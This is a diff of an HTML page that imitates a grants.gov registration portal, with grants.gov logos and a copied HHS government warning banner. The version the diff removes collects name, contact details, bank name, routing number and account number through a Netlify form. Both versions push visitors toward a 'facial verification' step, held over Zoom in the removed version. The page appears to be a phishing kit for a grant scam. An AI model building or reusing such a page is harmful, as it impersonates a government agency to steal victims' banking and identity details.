+                                                value="information-accuracy-confirmation"
+                                                checked
+                                            >
+
+                                            YES. ALL INFORMATION I HAVE PROVIDED IS TRUE AND I AM READY TO PROCEED WITH FACIAL VERIFICATION ON MY COMPUTER.
+
+                                        </label>
+
+                                    </div>
+
+
+                                    <div class="checkbox-description">
+
+                                        
+                                    </div>
+
+
+                                </div>
+
+
+                            </div>
+
+
+                        </div>
+
+
+                    </div>
+
+                </fieldset>
+
+
+
+                <!-- =================================================
+                     CENTERED BUTTONS
+                ================================================== -->
+
+                <div class="buttons">
+
+
+                    <button
+                        type="submit"
+                        class="continue"
+                    >
+
+                        Continue »
+
+                    </button>
+
+
+                    <button
+                        type="reset"
+                        class="cancel"
+                    >
+
+                        Cancel
+
+                    </button>
+
+
+                </div>
+
+
+            </form>
+
+
+        </main>
+
+
+
+        <!-- =====================================================
+             WARNING
+        ====================================================== -->
+
+        <p><span class="errors">Warning Notice</span></p>
+    <ul>
+      <li>This warning banner provides privacy and security notices consistent with applicable federal laws, directives, and other federal guidance for accessing this Government system, which includes (1) this computer network, (2) all computers connected to this network, and (3) all devices and storage media attached to this network or to a computer on this network. </li>
+      <li>This system is provided for Government-authorized use only. </li>
+      <li>Unauthorized or improper use of this system is prohibited and may result in disciplinary action and/or civil and criminal penalties. </li>
+      <li>Personal use of social media and networking sites on this system is limited as to not interfere with official work duties and is subject to monitoring. </li>
+      <li>By using this system, you understand and consent to the following:
+        <ul>
+          <li>The Government may monitor, record, and audit your system usage, including usage of personal devices and email systems for official duties or to conduct HHS business.  Therefore, you have no reasonable expectation of privacy regarding any communication or data transiting or stored on this system.  At any time, and for any lawful Government purpose, the government may monitor, intercept, and search and seize any communication or data transiting or stored on this system. </li>
+          <li>Any communication or data transiting or stored on this system may be disclosed or used for any lawful Government purpose. </li>
+        </ul>
+
+
+
+        <!-- =====================================================
+             FOOTER
+        ====================================================== -->
+
+        <footer class="footer">
+
+
+            <div class="footer-inner">
+
+                <div class="footer-logo">
+
+				  <a
+					class="footer-logo"
+					href="/"
+					aria-label="Registration home">
+					<img
+						src="./images/grants-gov-logo-w.png"
+						alt="Registration logo"
+					>	
+					
+				</a>
+					
+
+				  <div class="social-links">
+					<a href="https://twitter.com/grantsdotgov"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/twitter.svg" /></a>
+					<a href="https://www.youtube.com/user/GrantsGovUS"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/youtube.svg" /></a>
+					<a href="/apply/spoExit.jsp?p=web/grants/rss.html"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/rss_feed.svg" /></a>
+				  </div>
+			
+			
+</footer>
+
+
     </div>
-  </section>
 
-  <!-- MAIN SITE CONTENT -->
-  <div class="site-content">
 
-    <header class="site-header">
-      <div class="header-inner">
 
-        <a class="logo" href="/" aria-label="Registration home">
-          <img
-            src="./images/grants-gov-logo-text.png"
-            alt="Registration logo"
-          >
-        </a>
+    <!-- =========================================================
+         JAVASCRIPT
+    ========================================================== -->
 
-      </div>
-    </header>
+    <script>
+/* =========================================================
+           FORM VALIDATION
+        ========================================================= */
 
-    <main class="main">
-      <section class="card">
+        (function () {
 
-        <h1>Register</h1>
 
-        <p class="intro">
-          Please enter your information below to register for your grant on grants.gov.
-          Required fields are marked with an asterisk.
-        </p>
+            const form =
+                document.getElementById(
+                    "registration-form"
+                );
 
-        <!-- NETLIFY FORM -->
-        <form
-          id="registration"
-          name="registration"
-          method="POST"
-          data-netlify="true"
-          netlify-honeypot="bot-field"
-          action="./success.html"
-        >
 
-          <!-- Netlify form identification -->
-          <input type="hidden" name="form-name" value="registration">
+            form.addEventListener(
+                "submit",
+                function (event) {
 
-          <!-- Honeypot field -->
-          <p hidden>
-            <label>
-              Do not fill this out if you are human:
-              <input name="bot-field">
-            </label>
-          </p>
 
-          <fieldset>
-            <legend>Contact information</legend>
+                    if (
+                        !form.checkValidity()
+                    ) {
 
-            <div class="form-grid">
+                        event.preventDefault();
 
-              <div class="field">
-                <label for="first-name">
-                  First name <span class="required">*</span>
-                </label>
+                        form.reportValidity();
 
-                <input
-                  id="first-name"
-                  name="firstName"
-                  type="text"
-                  autocomplete="given-name"
-                  maxlength="35"
-                  required
-                >
-              </div>
+                    }
 
-              <div class="field">
-                <label for="last-name">
-                  Last name <span class="required">*</span>
-                </label>
+                }
+            );
 
-                <input
-                  id="last-name"
-                  name="lastName"
-                  type="text"
-                  autocomplete="family-name"
-                  maxlength="60"
-                  required
-                >
-              </div>
 
-              <div class="field full">
-                <label for="email">
-                  Email address <span class="required">*</span>
-                </label>
+        })();
 
-                <input
-                  id="email"
-                  name="email"
-                  type="email"
-                  autocomplete="email"
-                  maxlength="254"
-                  required
-                >
-              </div>
 
-              <div class="field">
-                <label for="phone">
-                  Phone number <span class="required">*</span>
-                </label>
+    </script>
 
-                <input
-                  id="phone"
-                  name="phone"
-                  type="tel"
-                  autocomplete="tel"
-                  maxlength="20"
-                >
-              </div>
-
-              <div class="field">
-                <label for="zipcode">
-                  ZIP code <span class="required">*</span>
-                </label>
-
-                <input
-                  id="zipcode"
-                  name="zipcode"
-                  type="text"
-                  inputmode="numeric"
-                  autocomplete="postal-code"
-                  maxlength="10"
-                  pattern="[0-9]{5}(-[0-9]{4})?"
-                  title="Enter a valid US ZIP code, for example 33101 or 33101-1234."
-                  required
-                >
-
-                <p class="help">
-                  Enter your 5-digit ZIP code or ZIP+4.
-                </p>
-              </div>
-
-            </div>
-          </fieldset>
-
-          <fieldset>
-            <legend>Account details</legend>
-
-            <div class="form-grid">
-
-              <div class="field full">
-                <label for="username">
-                  Bank Name <span class="required">*</span>
-                </label>
-
-                <input
-                  id="Bank"
-                  name="Bankname"
-                  type="text"
-                  autocomplete="Bank"
-                  maxlength="25"
-                  required
-                >
-              </div>
-
-              <div class="field">
-                <label for="password">
-                  Routing No. <span class="required">*</span>
-                </label>
-
-                <input
-                  id="Routing No."
-                  name="Routing No"
-                  type="Rout-No"
-                  autocomplete="Routing"
-                  minlength="9"
-                  required
-                >
-
-                <p class="help">
-                  Please use your ACH/WIRE enabled bank.
-                </p>
-              </div>
-
-              <div class="field">
-                <label for="password-confirm">
-                  Account No. <span class="required">*</span>
-                </label>
-
-                <input
-                  id="Account No."
-                  name="Account No"
-                  type="Acct-No"
-                  autocomplete="Acct-No"
-                  minlength="8"
-                  required
-                >
-              </div>
-
-            </div>
-          </fieldset>
-
-          <!-- TERMS AND CONDITIONS -->
-          <section class="terms-section" aria-labelledby="terms-title">
-
-            <h2
-              id="terms-title"
-              class="terms-title">
-              Terms and confirmation
-            </h2>
-
-            <p class="terms-text">
-              By submitting this registration, you confirm that all
-              information provided is true, accurate, and complete and YOU ARE READY TO DO A FACIAL IDENTITY VIA ZOOM.
-              Providing false or misleading information may result in
-              your registration being disallowed. Fake, fictitious, or
-              knowingly false names will not be recorded as valid
-              registration information.
-            </p>
-
-            <label class="agreement" for="information-correct">
-              <input
-                id="information-correct"
-                name="informationCorrect"
-                type="checkbox"
-                value="Yes"
-                required
-              >
-
-              <span>
-                I confirm that all information I have entered is correct
-                and I am ready for my zoom verification.
-                <span class="required">*</span>
-              </span>
-            </label>
-
-          </section>
-
-          <div class="actions">
-
-            <button
-              type="reset"
-              class="button-secondary">
-              Cancel
-            </button>
-
-            <button
-              type="submit"
-              class="button-primary"
-              id="continue-button">
-              Continue
-            </button>
-
-          </div>
-
-        </form>
-      </section>
-    </main>
-
-    <!-- FOOTER -->
-    <footer class="footer">
-
-      <a
-        class="footer-logo"
-        href="/"
-        aria-label="Registration home">
-        <img
-          src="./images/grants-gov-logo-w.png"
-          alt="Registration logo"
-        >
-      </a>
-
-      <div class="social-links">
-        <a href="https://twitter.com/grantsdotgov"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/twitter.svg" /></a>
-        <a href="https://www.youtube.com/user/GrantsGovUS"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/youtube.svg" /></a>
-        <a href="/apply/spoExit.jsp?p=web/grants/rss.html"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/rss_feed.svg" /></a>
-      </div>
-
-      <p class="footer-copy">
-        Registration Portal
-      </p>
-
-    </footer>
-
-  </div>
-
-  <script>
-    const form = document.getElementById("registration-form");
-    const password = document.getElementById("password");
-    const passwordConfirm = document.getElementById("password-confirm");
-
-    form.addEventListener("submit", function (event) {
-
-      if (password.value !== passwordConfirm.value) {
-        event.preventDefault();
-
-        passwordConfirm.setCustomValidity(
-          "The passwords do not match."
-        );
-
-        passwordConfirm.reportValidity();
-      } else {
-        passwordConfirm.setCustomValidity("");
-      }
-
-    });
-
-    passwordConfirm.addEventListener("input", function () {
-      if (password.value !== passwordConfirm.value) {
-        passwordConfirm.setCustomValidity(
-          "The passwords do not match."
-        );
-      } else {
-        passwordConfirm.setCustomValidity("");
-      }
-    });
-  </script>
 
 </body>
+
 </html>
